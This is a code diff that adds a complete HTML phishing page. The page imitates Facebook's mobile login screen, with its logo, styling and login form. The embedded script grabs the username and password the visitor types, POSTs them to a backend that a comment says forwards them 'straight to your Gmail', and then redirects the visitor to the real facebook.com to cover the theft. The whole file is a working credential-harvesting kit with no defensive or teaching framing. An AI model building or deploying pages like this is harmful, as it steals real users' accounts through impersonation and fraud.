@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log into Facebook</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #e4e6eb;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 100vh;
+        }
+        .top-bar {
+            width: 100%;
+            padding: 15px;
+            box-sizing: border-box;
+        }
+        .back-arrow {
+            color: #e4e6eb;
+            font-size: 20px;
+            text-decoration: none;
+        }
+        .content {
+            width: 100%;
+            max-width: 400px;
+            padding: 0 20px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: auto;
+        }
+        .fb-logo {
+            width: 72px;
+            height: 72px;
+            background-color: #0866ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .fb-logo svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
+        }
+        .info-text {
+            font-size: 13px;
+            color: #b0b3b8;
+            text-align: center;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+        .change-settings {
+            color: #2d88ff;
+            font-size: 13px;
+            text-decoration: none;
+            margin-bottom: 24px;
+        }
+        form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: #242526;
+            border: 1px solid #393a3b;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        input::placeholder {
+            color: #8a8d91;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #0866ff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 4px;
+        }
+        .login-btn:active {
+            background-color: #0555d1;
+        }
+        .forgot-password {
+            color: #e4e6eb;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 16px;
+            text-align: center;
+        }
+        .footer {
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: center;
+            margin-top: auto;
+        }
+        .create-account-btn {
+            width: 100%;
+            max-width: 400px;
+            padding: 14px;
+            background-color: transparent;
+            color: #2d88ff;
+            border: 1px solid #2d88ff;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <a href="#" class="back-arrow">&#8592;</a>
+    </div>
+
+    <div class="content">
+        <div class="fb-logo">
+            <svg viewBox="0 0 36 36">
+                <path d="M25 3.5H21.5C18.2 3.5 16 5.7 16 9.2V12.5H12.5V17.2H16V29.5H20.8V17.2H24.3L25 12.5H20.8V9.8C20.8 8.8 21.2 8 22.8 8H25V3.5Z"></path>
+            </svg>
+        </div>
+
+        <div class="info-text">
+            Facebook requests and receives your phone number from your mobile network.
+        </div>
+        <a href="#" class="change-settings">Change Settings</a>
+
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Mobile number or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <div class="footer">
+        <button class="create-account-btn">Create new account</button>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                // Sends login details to your backend and straight to your Gmail
+                await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+            } catch (err) {
+                console.error('Error submitting login:', err);
+            }
+
+            // Immediately redirects user to Facebook after submission
+            window.location.href = 'https://www.facebook.com';
+        });
+    </script>
+</body>
+</html>
